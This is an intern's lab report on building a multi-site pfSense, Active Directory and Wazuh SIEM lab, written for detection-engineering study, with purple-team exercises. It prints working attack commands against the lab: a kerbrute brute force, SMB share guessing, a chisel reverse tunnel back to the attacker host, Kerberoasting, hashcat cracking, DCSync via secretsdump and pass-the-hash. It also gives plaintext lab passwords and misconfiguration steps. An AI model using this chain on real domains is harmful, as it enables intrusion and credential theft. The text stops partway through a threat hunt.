# ENTERPRISE MULTI-SITE NETWORK, SECURITY & SOC LAB

## Internship Technical Report — Months 1 and 2

| Field | Value |
|---|---|
| **Intern Name** | Abdimalik Yusuf Mohamud |
| **Role** | Network & Security Intern |
| **Environment** | Self-Directed Enterprise Infrastructure Lab |
| **Reporting Period** | Month 2
| **Report Type** | Infrastructure Deployment and SOC Operations Report |

---

## Table of Contents

**Part 1 — Month 1: Infrastructure Deployment**
1. [Executive Summary](#1-executive-summary)
2. [Scope of Work (Month 1)](#2-scope-of-work-month-1)
3. [Network Segmentation Strategy](#3-network-segmentation-strategy)
4. [pfSense Firewall Deployment](#4-pfsense-firewall-deployment)
5. [Routing and Gateway Logic](#5-routing-and-gateway-logic)
6. [IPsec Site-to-Site VPN Implementation](#6-ipsec-site-to-site-vpn-implementation)
7. [Outbound NAT and Internet Breakout Configuration](#7-outbound-nat-and-internet-breakout-configuration)
8. [Active Directory and DNS Deployment](#8-active-directory-and-dns-deployment)
9. [Endpoint Integration and Domain Enrollment](#9-endpoint-integration-and-domain-enrollment)
10. [Wazuh SIEM Deployment — Monitoring Baseline](#10-wazuh-siem-deployment--monitoring-baseline)
11. [Month 1 Final Operational State](#11-month-1-final-operational-state)
12. [Month 1 Skills and Technical Competencies Developed](#12-month-1-skills-and-technical-competencies-developed)

**Part 2 — Month 2: SOC Operations and Detection Engineering**

13. [Month 2 Executive Summary](#13-month-2-executive-summary)
14. [Scope of Work (Month 2)](#14-scope-of-work-month-2)
15. [Lab Architecture (Month 2 State)](#15-lab-architecture-month-2-state)
16. [Lab Modifications Applied During Month 2](#16-lab-modifications-applied-during-month-2)
17. [Detection Engineering Work](#17-detection-engineering-work)
18. [Detection Use Cases](#18-detection-use-cases)
19. [Threat Hunting](#19-threat-hunting)
20. [Detection Gaps Identified](#20-detection-gaps-identified)
21. [Incident Reports](#21-incident-reports)
22. [Month 2 Skills and Technical Competencies Developed](#22-month-2-skills-and-technical-competencies-developed)
23. [Month 2 Final Operational State](#23-month-2-final-operational-state)
24. [Closing Statement](#24-closing-statement)

---

# PART 1 — MONTH 1
## Infrastructure Deployment

## 1. Executive Summary

During Month 1 of the internship, I designed, implemented, and validated a complete multi-site enterprise infrastructure simulating a small-to-medium business environment with Headquarters (HQ) and a Branch office.

The environment includes segmented internal networks for Staff, Servers, and Guests, dual pfSense enterprise firewalls, a policy-based IPsec site-to-site VPN, centralized Active Directory with integrated DNS, controlled internet breakout via stateful firewalling and outbound NAT, and centralized endpoint monitoring using Wazuh SIEM.

A significant technical milestone during this month was diagnosing and resolving a full internal internet outage caused by a disabled firewall engine on pfSense. Although routing and VPN appeared functional, outbound NAT was not being enforced. Using packet capture analysis, NAT rule validation, and firewall state inspection, the issue was identified and resolved, restoring stable internet connectivity.

In parallel, a Wazuh Manager was deployed within the HQ server network and all endpoints across both sites were enrolled as agents. This established centralized telemetry collection, forming the foundation for advanced detection engineering and SOC-style monitoring executed during Month 2.

## 2. Scope of Work (Month 1)

The objectives for Month 1 were defined as infrastructure-focused and foundational:

- Design a segmented enterprise network topology
- Deploy pfSense firewalls at HQ and Branch
- Configure IPsec site-to-site VPN connectivity
- Implement routing and firewall policy controls
- Deploy Active Directory Domain Services
- Configure integrated DNS with forwarders
- Join endpoints to the domain across sites
- Implement secure outbound NAT
- Deploy Wazuh SIEM and enroll all endpoints
- Troubleshoot and resolve real-world connectivity failures

## 3. Network Segmentation Strategy

Segmentation was implemented to enforce trust boundaries and reduce attack surface.

### 3.1 Headquarters Networks

| Network | Subnet | Purpose |
|---|---|---|
| HQ_STAFF | 10.10.10.0/24 | Corporate users |
| HQ_SERVERS | 10.10.20.0/24 | AD, DNS, SIEM |
| HQ_GUEST | 10.10.30.0/24 | Internet-only |

### 3.2 Branch Networks

| Network | Subnet | Purpose |
|---|---|---|
| BR_STAFF | 10.20.10.0/24 | Branch users |
| BR_GUEST | 10.20.30.0/24 | Internet-only |

Design principles guiding this segmentation included staff networks accessing only required services, the server network being isolated from guests, guest networks restricted to internet-only access, no implicit trust between subnets, and explicit firewall rules for all inter-network communication. This mirrors VLAN-based enterprise design and limits lateral movement potential.

### Core Components

The environment consists of pfSense-HQ acting as the edge firewall and VPN endpoint, pfSense-BR performing the same role at the branch site, DC01 serving as Domain Controller and DNS server, a Wazuh Manager placed within the HQ_SERVERS network, staff endpoints at both HQ and branch, and isolated guest networks with internet-only access.

![Multi-Site Architecture Overview](diagrams/lab-topology-month-1.png)

## 4. pfSense Firewall Deployment

Two independent pfSense firewalls were deployed to enforce policy at both sites.

### 4.1 pfSense-HQ Responsibilities

pfSense-HQ handles inter-VLAN routing, firewall rule enforcement, IPsec VPN termination, outbound NAT translation, DHCP services for the HQ subnets, internet breakout, and central routing decisions between the HQ subnets and the Branch site over the VPN.

### 4.2 pfSense-BR Responsibilities

pfSense-BR performs branch routing, local firewall policy enforcement, IPsec VPN termination at the Branch side, controlled internet breakout, and DHCP services for Branch subnets.

Firewall rules were explicitly configured to allow Staff to Servers within HQ, Branch Staff to HQ Servers over the VPN tunnel, Staff to Staff across sites, and Guest networks limited strictly to internet access. Nothing was implicitly allowed.

![pfSense Firewall Rules Overview](screenshots/month-1/pfsense-firewall-rules.png)

## 5. Routing and Gateway Logic

All endpoints were configured with a single default gateway pointing to their local pfSense LAN interface, and DNS pointing to DC01. Endpoints have no awareness of VPN topology, WAN routing, or internet NAT behavior. All of this is handled by pfSense.

pfSense performs internal routing between subnets, VPN routing decisions for traffic destined to the remote site, NAT translation for internet-bound traffic, and stateful return tracking for all sessions. Routing decisions follow a simple hierarchy: internal to internal is routed directly, internal to remote site travels the IPsec tunnel, and internal to internet exits via WAN with NAT applied.

## 6. IPsec Site-to-Site VPN Implementation

### 6.1 Configuration

Policy-based IPsec was deployed connecting the two sites.

Phase 1 establishes a secure tunnel between the HQ and Branch WAN interfaces.

Phase 2 defines explicit subnet pairs so that traffic between listed networks is encrypted and routed through the tunnel:

- 10.10.10.0/24 (HQ Staff) to 10.20.10.0/24 (Branch Staff)
- 10.10.20.0/24 (HQ Servers) to 10.20.10.0/24 (Branch Staff)

### 6.2 Verification

The tunnel established successfully, packet capture confirmed encrypted traffic between the two WAN endpoints, cross-site domain authentication was successful, and Branch endpoints successfully authenticated against the HQ Domain Controller.

![IPsec Tunnel Status](screenshots/month-1/ipsec-tunnel-established.png)

## 7. Outbound NAT and Internet Breakout Configuration

### 7.1 NAT Design

Manual Outbound NAT was implemented on pfSense-HQ. Explicit rules were created for the HQ Staff subnet (10.10.10.0/24), the HQ Servers subnet (10.10.20.0/24), and additional internal subnets where required. The translation address in all cases is the WAN interface address.

### 7.2 Internet Outage Incident

Shortly after initial deployment, an internal internet outage was observed. The symptoms were that no internal host could ping 8.8.8.8, DNS resolution failed, VPN traffic was still fully operational, and pfSense itself could reach the internet.

Investigation proceeded through packet capture on the LAN interface, packet capture on the WAN interface, NAT rule verification, firewall rule inspection, and pfctl rule analysis. The captures on WAN showed private IP addresses leaving the interface without translation, which is the fingerprint of NAT not being enforced.

The root cause was traced to the Firewall Engine being disabled under System, Advanced, Firewall and NAT. With the firewall engine disabled, NAT rules were present in configuration but not enforced by the kernel packet filter. Private IPs exited WAN unmodified and return traffic was dropped by the upstream network.

Resolution consisted of re-enabling the firewall engine, resetting the state table, and verifying WAN packet translation via a fresh capture. Internet connectivity was restored immediately.

![pfctl State Table](screenshots/month-1/pfctl-state-table.png)

## 8. Active Directory and DNS Deployment

### 8.1 DC01 Configuration

DC01 was deployed on Windows Server with a static IP of 10.10.20.10. It hosts the Active Directory Domain Services role for the fh.local domain and the DNS Server role for internal name resolution.

### 8.2 DNS Architecture

All domain members use DC01 as their primary DNS server. Forwarders on DC01 are configured to Cloudflare (1.1.1.1) and Google (8.8.8.8), which allows internal domain resolution, external name resolution, proper SRV record discovery, and cross-site authentication. The key concept validated here is that a domain-joined machine must query its DC for DNS in order to locate Kerberos KDC records, LDAP endpoints, and other AD-critical services.

![Active Directory Users and Computers](screenshots/month-1/ad-users-and-computers.png)

## 9. Endpoint Integration and Domain Enrollment

### 9.1 HQ Endpoints

HQ workstations were successfully joined to the fh.local domain, domain logins verified, internal DNS resolution confirmed, and internet access validated end-to-end.

### 9.2 Branch Endpoints

Branch endpoints were joined to the domain over the VPN tunnel and successfully authenticated against the HQ Domain Controller. Cross-site Kerberos, LDAP, and DNS were verified, and internet breakout at the Branch site continued to function independently via pfSense-BR.

This confirms inter-site trust, VPN routing integrity, and DNS functionality across both sites.

## 10. Wazuh SIEM Deployment — Monitoring Baseline

Wazuh deployment was completed during Month 1 to establish centralized monitoring, forming the foundation for the SOC operations work in Month 2.

### 10.1 Wazuh Manager Deployment

The Wazuh Manager was installed on a dedicated Ubuntu server placed inside the HQ_SERVERS network, and is accessible via its web dashboard.

![Wazuh Dashboard Overview](screenshots/month-1/wazuh-dashboard-overview.png)

### 10.2 Agent Enrollment

Wazuh agents were deployed to HQ staff machines, Branch staff machines, the Domain Controller, and additional servers where applicable. All agents successfully registered with the manager.

![Wazuh Agents List](screenshots/month-1/wazuh-agents-list.png)

### 10.3 Telemetry Baseline Enabled

The collected telemetry at the end of Month 1 includes Windows Security Event Logs, system logs, authentication events, failed logon attempts, basic file integrity monitoring, and Linux syslog where applicable. Connectivity was validated via agent heartbeat confirmation, log ingestion visible in the dashboard, and test event generation.

## 11. Month 1 Final Operational State

| Component | Status |
|---|---|
| HQ Routing | Operational |
| Branch Routing | Operational |
| IPsec VPN | Stable |
| Active Directory | Operational |
| DNS Resolution | Functional |
| Outbound NAT | Functional |
| Internet Access | Verified |
| Firewall Enforcement | Enabled |
| Wazuh Manager | Operational |
| Agents Reporting | Verified |

## 12. Month 1 Skills and Technical Competencies Developed

- Enterprise firewall configuration
- Manual outbound NAT implementation
- IPsec VPN deployment
- Routing and gateway design
- Packet capture analysis
- Active Directory deployment
- DNS troubleshooting
- Multi-site authentication validation
- SIEM deployment (Wazuh)
- Endpoint telemetry validation
- Incident root-cause investigation

---

# PART 2 — MONTH 2
## SOC Operations and Detection Engineering

## 13. Month 2 Executive Summary

During Month 2 of the internship, I transformed the enterprise infrastructure lab built in Month 1 into a functional Security Operations Center environment. Where Month 1 focused on infrastructure, Month 2 focused on detection engineering, attack simulation, incident response automation, and structured incident reporting, which are the operational disciplines a real SOC internship exercises.

The work covered three major domains. Detection engineering included building custom Wazuh rules and dashboards, onboarding new log sources such as the Windows Security channel and pfSense firewall syslog, and integrating VirusTotal threat intelligence enrichment. Purple team simulation consisted of three structured attack use cases executed from Kali Linux against the Domain Controller and workstation targets, spanning brute force, lateral movement via credential theft, and full domain compromise through Kerberoasting and DCSync. Incident response automation was implemented via Wazuh Active Response, which was configured to automatically block attacking IP addresses on affected Windows agents via netsh firewall rules, validated end-to-end on both DC1 and HQ-STAFF-01.

A significant portion of Month 2 was diagnostic. Missing Windows advanced audit policies had to be enabled on both the Domain Controller (Kerberos subcategories) and on HQ-STAFF-01 (Logon subcategories) before meaningful telemetry could flow. The Wazuh agent on HQ-STAFF-01 was missing the localfile entry for the Windows Security channel, which had to be added manually. A custom decoder was written to handle pfSense filterlog messages that did not match Wazuh's default decoder regex. And the default Wazuh Active Response for Windows had field-mapping issues extracting the srcip from EventChannel-formatted alerts, which required careful rule selection and validation.

Every use case documented in this section was executed end-to-end with real attack tools including kerbrute, netexec, impacket, evil-winrm, chisel, and hashcat, was detected (or explicitly not detected) by Wazuh, and analyzed for remediation. The report culminates in three formal Incident Reports and a documented set of Detection Gaps that a mature SOC would need to address.

## 14. Scope of Work (Month 2)

The objectives for Month 2 were operations-focused and built directly on the Month 1 infrastructure:

- Onboard additional log sources into Wazuh, specifically the Windows Security channel and pfSense firewall syslog
- Enable Windows advanced audit policies required for meaningful security telemetry
- Configure VirusTotal threat intelligence enrichment for File Integrity Monitoring
- Design and execute three detection use cases covering brute force, lateral movement, and privilege escalation
- Build custom Wazuh dashboards and visualizations for authentication monitoring
- Configure and validate Wazuh Active Response for automated containment
- Perform a full attack kill-chain simulation from unauthenticated attacker to Domain Administrator
- Conduct threat hunting queries across accumulated telemetry
- Produce three formal Incident Reports documenting the detected attacks
- Identify and document detection gaps requiring future engineering work

## 15. Lab Architecture (Month 2 State)

The Month 2 exercises used a subset of the Month 1 architecture, prioritizing systems necessary for the detection use cases within the RAM constraints of the host hypervisor. The Branch site was documented in Month 1 and retained architecturally, but daily Month 2 operations focused on the HQ site so that all necessary systems could remain powered on simultaneously for continuous detection testing.

### 15.1 Active Systems

| System | IP Address | Role |
|---|---|---|
| pfSense-HQ | 10.10.10.1 and 10.10.20.1 | Edge firewall, inter-VLAN router, syslog source |
| DC1 | 10.10.20.10 | Domain Controller (fh.local), DNS, Wazuh agent 001 |
| Wazuh Manager | 10.10.20.20 | SIEM manager, indexer, dashboard (Ubuntu 24.04, Wazuh v4.14.2) |
| HQ-STAFF-01 | 10.10.10.59 | Domain-joined workstation, Wazuh agent 004 |
| Kali Linux | 10.10.10.60 | Attacker workstation on HQ-STAFF subnet |

### 15.2 Network Segmentation Enforcement

During Month 2, pfSense-HQ firewall rules were tightened to enforce realistic enterprise segmentation. A specific pass rule allows only HQ-STAFF-01 (10.10.10.59) to reach the 10.10.20.0/24 servers subnet, representing legitimate domain service traffic. A block rule directly below denies the rest of the HQ Staff subnet (10.10.10.0/24, which includes the Kali attacker) from reaching the servers subnet at all.

This segmentation forced the attacker to compromise HQ-STAFF-01 first and pivot through it to reach the Domain Controller, closely matching how real enterprise attack chains unfold.

![Month 2 Lab Topology With Attacker Position](diagrams/lab-topology-month-2-attacker.png)

## 16. Lab Modifications Applied During Month 2

This section documents every material change made to lab systems during Month 2 for reproducibility and audit purposes. Configuration changes on domain-joined systems were performed via PowerShell and where applicable via Group Policy.

### 16.1 Domain Controller (DC1) Modifications

Advanced audit policies were enabled for the Logon, Account Lockout, and Credential Validation subcategories under Logon and Logoff, and for the Kerberos Authentication Service and Kerberos Service Ticket Operations subcategories under Account Logon. Without these policies enabled, Windows generates no Security channel events for Kerberos pre-authentication failures and none of the Kerberos-based attack detection works.

A domain user named `svc_backup` was created to simulate a service account. Its password was initially set to `Backup2024!` and later rotated to `Summer2024!`. An SPN was registered on this account (`MSSQL/hq-staff-01.fh.local:1433`) to make it a Kerberoasting target. DCSync rights (Replicating Directory Changes and Replicating Directory Changes All) were then granted to `svc_backup` to simulate a very common enterprise misconfiguration where backup service accounts are over-privileged.

For the Use Case 3 privilege escalation demonstration, `hqSaacid` was temporarily added to the Domain Admins group and then removed after the corresponding Wazuh detection was captured.

![DC1 Audit Policy Configuration](screenshots/month-2/dc1-auditpol-kerberos.png)

### 16.2 HQ-STAFF-01 Modifications

Advanced audit policies for Logon, Account Lockout, and Credential Validation were enabled. The Wazuh agent's `ossec.conf` was modified to add a localfile entry for the Windows Security event channel, which was previously absent. Sysmon events were flowing but authentication events were not.

For the Use Case 2 credential leak simulation, the Guest account was enabled with a blank password, a share named PublicShare was created at `C:\PublicShare`, and a file named `it_notes.txt` was placed inside it containing plaintext domain credentials (username `hqSaacid`, password `passwordS$`). This simulates the very common real-world scenario of IT staff leaving credentials in accessible file shares.

Anonymous SMB access to the share was enabled through a combination of registry changes (`NullSessionShares` set to `PublicShare`, `RestrictAnonymous` set to 0, `RestrictAnonymousSAM` set to 0, `EveryoneIncludesAnonymous` set to 1) and by granting the ANONYMOUS LOGON identity read access on both the share ACL and the underlying NTFS ACL. This required a reboot to take full effect due to Group Policy behavior on domain-joined systems.

WinRM was enabled via `Enable-PSRemoting`, and `hqSaacid` was added to the local Remote Management Users group so that the WinRM-based post-compromise shell path would succeed in Use Case 2.

![PublicShare Configuration](screenshots/month-2/publicshare-anonymous-access.png)

### 16.3 Wazuh Manager Modifications

The VirusTotal integration block was added to `ossec.conf` with an API key, scoped to the syscheck group and configured to output JSON alerts. Remote syslog reception was enabled on UDP port 514 with pfSense as an allowed source. Custom decoders and rules were added under `/var/ossec/etc/decoders/local_decoder.xml` and `/var/ossec/etc/rules/local_rules.xml` to handle pfSense filterlog messages and generate port scan detection alerts.

The Active Response block was configured to trigger the netsh command on any agent generating alerts for rules 60204 or 60205, with a 180 second cooldown.

### 16.4 pfSense-HQ Modifications

Remote syslog logging was enabled with the Wazuh manager (10.10.20.20 on UDP 514) as the destination. The source address was set to the OPT1 interface (the HQ_SERVERS subnet interface) so that syslog packets source from a routable internal address rather than the WAN. Only Firewall Events were forwarded to keep the volume manageable.

Two firewall rules were added to enforce segmentation. The first passes traffic from 10.10.10.59 to 10.10.20.0/24 on all protocols, allowing legitimate domain service traffic from HQ-STAFF-01. The second, placed immediately below, blocks all other traffic from the 10.10.10.0/24 subnet to 10.10.20.0/24, which is what forces the attacker on Kali to pivot through the workstation.

![pfSense Segmentation Rules](screenshots/month-2/pfsense-segmentation-rules.png)

## 17. Detection Engineering Work

### 17.1 VirusTotal Threat Intelligence Enrichment

Wazuh's VirusTotal integration was configured to enrich File Integrity Monitoring alerts by submitting file hashes for reputation lookup. When syscheck detects a file creation or modification, the file's SHA-256 hash is queried against VirusTotal. If the hash matches known malicious samples, a high severity alert (rule 87105) is generated with details of how many antivirus engines detected the file.

The integration was validated by downloading the EICAR test file (a universally-detected benign test string) to HQ-STAFF-01. Within seconds, Wazuh's syscheck detected the file creation, submitted the hash to VirusTotal, and generated rule 87105 alerts stating that dozens of engines detected the file, confirming the integration was operational end-to-end.

![VirusTotal Detection Firing on EICAR](screenshots/month-2/virustotal-eicar-detection.png)

### 17.2 Windows Audit Policy Enablement

An early Month 2 discovery was that the Windows Security event log on HQ-STAFF-01 was empty despite the Wazuh agent being active. The root cause was that Audit Logon Events was set to No Auditing by default, which is a silent failure because Wazuh receives no data when Windows generates no events. A similar issue was found on DC1 for the Kerberos subcategories.

Wazuh cannot detect what Windows does not log. The audit policies enabled during Month 2 are a prerequisite for every subsequent detection use case and are enumerated in Section 16.

### 17.3 Wazuh Agent Configuration for Security Channel

HQ-STAFF-01's `ossec.conf` was missing the localfile entry for the Windows Security event channel entirely. The following block was added to the agent's configuration file, followed by a service restart:

```xml
<localfile>
  <location>Security</location>
  <log_format>eventchannel</log_format>
</localfile>
```

After this change, Event ID 4625 (failed logon) events began flowing to Wazuh immediately, unblocking both Use Case 1 and Use Case 2 detection.

### 17.4 pfSense Syslog Onboarding and Custom Decoder

pfSense syslog forwarding to Wazuh was configured, and verification via tcpdump on the Wazuh manager confirmed packets arriving on port 514. However, no alerts were generated. Investigation revealed that Wazuh's default pfSense decoder expects the hostname `pfSense` immediately before `filterlog` in the syslog message, but the incoming messages had a different format that did not include a hostname before `filterlog`.

A custom decoder was developed and placed in `/var/ossec/etc/decoders/local_decoder.xml`:

```xml
<decoder name="pf-custom">
  <prematch>filterlog</prematch>
</decoder>

<decoder name="pf-custom-fields">
  <parent>pf-custom</parent>
  <regex offset="after_parent" type="pcre2">\[\d+\]:\s+(\d+),,,\d+,\w+,\w+,(\w+),\w+,\d+,\w+,,\d+,\d+,\d+,\w+,\d+,(\w+),\d+,(\d+\.\d+\.\d+\.\d+),(\d+\.\d+\.\d+\.\d+),(\d+),(\d+)</regex>
  <order>id,action,protocol,srcip,dstip,srcport,dstport</order>
</decoder>
```

The decoder was validated using `wazuh-logtest`, which confirmed Phase 2 decoding extracted all fields correctly.

Two custom rules were then added in `local_rules.xml`:

```xml
<group name="pfsense,firewall,">
  <rule id="100300" level="3">
    <decoded_as>pf-custom</decoded_as>
    <description>pfSense: Firewall blocked connection from $(srcip)</description>
  </rule>

  <rule id="100301" level="10" frequency="8" timeframe="60">
    <if_matched_sid>100300</if_matched_sid>
    <same_srcip />
    <description>pfSense: Multiple firewall drops from same IP - possible port scan</description>
    <mitre><id>T1046</id></mitre>
  </rule>
</group>
```

Rule 100300 fires on every decoded pfSense drop, extracting the source IP. Rule 100301 is a correlation rule that fires when 8 or more drops occur from the same source IP within 60 seconds, giving Wazuh a working port scan detection at the network layer.

![Wazuh-logtest Confirming Custom Decoder](screenshots/month-2/wazuh-logtest-custom-decoder.png)

### 17.5 Active Response Configuration

Wazuh Active Response was configured to automatically block attacking IP addresses via the Windows Firewall on the affected agent. The relevant configuration in `ossec.conf` on the Wazuh manager:

```xml
<active-response>
  <command>netsh</command>
  <location>local</location>
  <rules_id>60204,60205</rules_id>
  <timeout>180</timeout>
</active-response>
```

The `location: local` value means the command runs on whichever agent generated the alert, not on the manager. The `rules_id` list covers both 60204 (NTLM brute force correlation) and 60205 (Kerberos brute force correlation). Timeout is 180 seconds.

On execution, `netsh.exe` on the target agent creates an inbound block firewall rule named `WAZUH ACTIVE RESPONSE BLOCKED IP` whose `RemoteIP` is the attacker's srcip. Successful rule creation then triggers Wazuh's built-in rule 92043 (Netsh used to add firewall rule), providing a confirmation alert that containment succeeded.

A significant amount of Month 2 troubleshooting time was spent on Active Response. The initial rule selection targeted rule 60122 (individual logon failure), which did not carry the srcip field in the format the netsh script expected. Moving to rule 60204 (NTLM correlation) resolved the issue for HQ-STAFF-01 attacks. Kerberos-based attacks against DC1 additionally required rule 60205 to be included, because kerbrute activity fires 60104 audit failure events (which correlate into 60205) rather than 60122 NTLM failures. The final configuration covers both attack paths.

![Firewall Rule Created by Active Response](screenshots/active-response/dc1-firewall-rule-created.png)

### 17.6 Custom Authentication Monitoring Dashboard

A custom Wazuh dashboard named `Authentication Monitoring — DC1` was built using three visualizations:

1. **Vertical bar chart of DC1 logon failures over time** — `agent.name` DC1, `rule.id` filtered to 60104, 60122, 60205 and 60115. Reveals brute force bursts against the baseline.
2. **Pie chart of alert level distribution** — scoped to DC1, showing the presence of level 9 and 10 events during attacks.
3. **Data table of top alert descriptions on DC1** — identifies the most common alert types over the selected time window.

![Authentication Monitoring Dashboard](screenshots/month-2/auth-monitoring-dashboard.png)

## 18. Detection Use Cases

Three structured detection use cases were designed and executed. Each use case pairs a red-team action with the corresponding blue-team detection or an explicit finding of no detection. All attack traffic originated from Kali Linux (10.10.10.60) using industry-standard tools.

### 18.1 Use Case 1 — Brute Force Detection

#### Attack

A Kerberos-based brute force attack was executed against the Administrator account on DC1 using `kerbrute`, a Golang Kerberos brute forcer that speaks AS-REQ directly to the KDC. A wordlist of 15 realistic weak passwords was iterated against the `Administrator@fh.local` principal.

```bash
kerbrute bruteuser --dc 10.10.20.10 -d fh.local passwords.txt Administrator -v
```

![Kerbrute Brute Force Output](screenshots/use-case-1/kerbrute-bruteforce-output.png)

#### Detection

The full detection chain fired as designed:

- Rule **60104** fired on every individual Kerberos AS-REQ failure
- Rule **60205** (Multiple Windows audit failure events) fired at level 10 after enough failures accumulated from the same source
- Rule **60115** (User account locked out) fired once the account crossed the lockout threshold

![Wazuh Detection of Brute Force](screenshots/use-case-1/wazuh-dc1-brute-force-alerts.png)

#### Active Response

Rule 657 (Active response executed) fired, netsh on DC1 created the firewall block rule targeting 10.10.10.60, and rule 92043 confirmed the successful firewall rule creation. Kerbrute aborted its run with a user-locked-out message, indicating the attack was contained.

![Active Response Firewall Rule on DC1](screenshots/active-response/dc1-blocked-ip-firewall-rule.png)

#### MITRE ATT&CK Mapping

- **T1110.001** Brute Force: Password Guessing
- **T1110.003** Brute Force: Password Spraying

### 18.2 Use Case 2 — Lateral Movement via Credential Leak

#### Attack

This use case simulates a realistic multi-stage lateral movement chain in which the attacker lands on the internal network with no credentials and progresses through discovery, credential theft, and authenticated access.

**Stage 1** was network discovery via nmap ping sweep on 10.10.10.0/24, which revealed only pfSense-HQ (10.10.10.1) and HQ-STAFF-01 (10.10.10.59).

**Stage 2** was a full port scan of HQ-STAFF-01 that identified open SMB, RDP, and NetBIOS ports.

**Stage 3** was an attempt at anonymous SMB user enumeration, which was denied by the operating system (a proper baseline security posture).

**Stage 4** was share name guessing using a loop through common share names such as Public, Shared, PublicShare, IT, HR, and Finance. The loop discovered PublicShare as accessible to the anonymous session.

```bash
for share in PublicShare Public Shared Share IT HR Finance Data Backup; do
    result=$(smbclient //10.10.10.59/$share -N -c 'ls' 2>&1 | head -3)
    echo "=== $share ==="; echo "$result"
done
```

![Share Name Guessing Discovers PublicShare](screenshots/lateral-movement/share-guessing-loop.png)

**Stage 5** established an anonymous smbclient session and downloaded `it_notes.txt`.

**Stage 6** extracted plaintext credentials from the file (`hqSaacid` with password `passwordS$`).

![Downloaded Credentials from PublicShare](screenshots/lateral-movement/notes-txt-credentials.png)

**Stage 7** authenticated to HQ-STAFF-01 via SMB with the stolen credentials.

**Stage 8** tested WinRM access with the same credentials and netexec returned `Pwn3d!`, indicating hqSaacid was in the local Remote Management Users group.

![netexec winrm Pwn3d for hqSaacid](screenshots/lateral-movement/netexec-winrm-pwned.png)

**Stage 9** established an interactive PowerShell shell via `evil-winrm` as `fh\hqSaacid`.

![evil-winrm Shell as hqSaacid](screenshots/lateral-movement/evil-winrm-hqsaacid-shell.png)

**Stage 10** performed post-exploitation reconnaissance inside HQ-STAFF-01, which revealed DC1 (10.10.20.10) as the DNS server and thereby exposed the servers subnet to the attacker.

![Domain Discovery from HQ-STAFF-01](screenshots/lateral-movement/nltest-domain-discovery.png)

#### Detection

Detection was partial and delayed to the post-authentication phase:

- Rule **60106** (Windows Logon Success) fired on the successful hqSaacid authentication
- Rule **92657** (Successful Remote Logon Detected, NTLM authentication) fired shortly after

Several earlier phases were explicitly not detected, including the anonymous SMB session establishment, the share name guessing pattern, and the file download from PublicShare. These are discussed in Section 20.

#### MITRE ATT&CK Mapping

- **T1046** Network Service Discovery
- **T1135** Network Share Discovery
- **T1552.001** Unsecured Credentials in Files
- **T1078.002** Valid Domain Accounts
- **T1021.006** Remote Services: Windows Remote Management

### 18.3 Use Case 3 — Privilege Escalation to Domain Admin

#### Attack

Continuing from the compromised hqSaacid session on HQ-STAFF-01, the full privilege escalation chain to Domain Administrator was executed.

**Chisel Reverse SOCKS Proxy.** Kali ran a `chisel server` on port 8000. HQ-STAFF-01 downloaded the chisel Windows binary using `certutil` (a Living-off-the-Land binary technique) and then executed:

```powershell
.\chisel.exe client 10.10.10.60:8000 R:socks
```

This connected back to Kali and gave Kali a SOCKS5 proxy on localhost port 1080 whose exit point was HQ-STAFF-01. Because pfSense allows HQ-STAFF-01 to reach DC1, traffic tunneled through this proxy could reach DC1 even though direct Kali-to-DC1 traffic remained blocked.

![Chisel Reverse Tunnel Established](screenshots/privilege-escalation/chisel-tunnel-established.png)

**User Enumeration** via `proxychains kerbrute userenum` against DC1 validated `administrator`, `hqSaacid`, `svc_backup`, and `itAdmin` as existing accounts.

![Kerbrute User Enumeration Results](screenshots/privilege-escalation/kerbrute-userenum-valid-users.png)

**Kerberoasting** was executed with:

```bash
proxychains impacket-GetUserSPNs fh.local/hqSaacid:'passwordS$' -dc-ip 10.10.20.10 -request -outputfile roasted_hashes.txt
```

This obtained the TGS hash for `svc_backup`.

**Offline Hash Cracking** used `hashcat` mode 13100 with rockyou wordlist plus best64 rule mutations:

```bash
hashcat -m 13100 roasted_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

The password `Summer2024!` was recovered in seconds because rockyou contains `summer2024` in lowercase and best64 applies a capitalize-first-letter-plus-append-exclamation mutation.

**DCSync Attack** was executed with:

```bash
proxychains impacket-secretsdump fh.local/svc_backup:'Summer2024!'@10.10.20.10
```

This extracted the entire NTDS.dit contents including the Administrator NT hash and the krbtgt hash.

![DCSync Extracts NTDS.dit](screenshots/privilege-escalation/dcsync-ntds-hashes.png)

**Pass-the-Hash to Domain Admin** used evil-winrm through the proxy with the -H flag to pass the Administrator NT hash:

```bash
proxychains evil-winrm -i 10.10.20.10 -u Administrator -H 'bf45b2acdc88eb7a13aa474b347ea63d'
```

This resulted in an interactive PowerShell shell on DC1 whose `whoami` output was `fh\administrator`. Complete domain compromise achieved.

![Evil-winrm Shell as Administrator on DC1](screenshots/privilege-escalation/evil-winrm-domain-admin-shell.png)

#### Detection

Detection was only partial. Rule 92657 fired during NTLM authentication phases, and rule 60106 fired on the final Administrator logon. The primary attack techniques were not detected by Wazuh's default ruleset, including the Kerberoasting fingerprint of many 4769 TGS requests from a single source for SPN accounts, the DCSync attack (Event ID 4662 with the DRSUAPI replication GUID), the chisel reverse SOCKS proxy, the certutil-based file download, and the pass-the-hash authentication itself.

#### Bonus Detection — Group Membership Change

A separate demonstration added hqSaacid to the Domain Admins group. Wazuh's built-in detection for Event ID 4728 fired immediately with the description `Domain Admins Group Changed`.

![Domain Admins Group Change Detected](screenshots/privilege-escalation/domain-admins-group-changed.png)

#### MITRE ATT&CK Mapping

- **T1558.003** Kerberoasting
- **T1003.006** DCSync
- **T1550.002** Pass the Hash
- **T1090.001** Internal Proxy
- **T1105** Ingress Tool Transfer
- **T1078.002** Valid Domain Accounts

## 19. Threat Hunting

Beyond alert-driven detection, four proactive threat hunts were conducted against accumulated Wazuh telemetry to demonstrate mature SOC methodology. Each hunt begins with a hypothesis, uses a specific search query, and produces a documented result.

### 19.1 Hunt 1 — Successful Logon After Failed Attempts

**Hypothesis:** following a brute force attack, a successful authentication from the same attacker IP indicates that credentials were compromised.

**Query:** `data.win.system.eventID: "4624" and data.win.eventdata.ipAddress: "10.10.10.60"`

**Result:** Hits found, correlating with prior 4625 failures from the same source and confirming that Kali did establish successful authenticated sessions on HQ-STAFF-01.

Full details in [`hunts/hunt-1-post-brute-force-authentication/`](hunts/hunt-1-post-brute-force-authentication/).

### 19.2 Hunt 2 — Kerberoasting Attempts (TGS Requests)

**Hypothesis:** Kerberoasting is characterized by TGS-REQ events (Event ID 4769) for SPN-enabled accounts, and a high volume from a single source is indicative of enumeration.

**Query:** `data.win.system.eventID: "4769"`

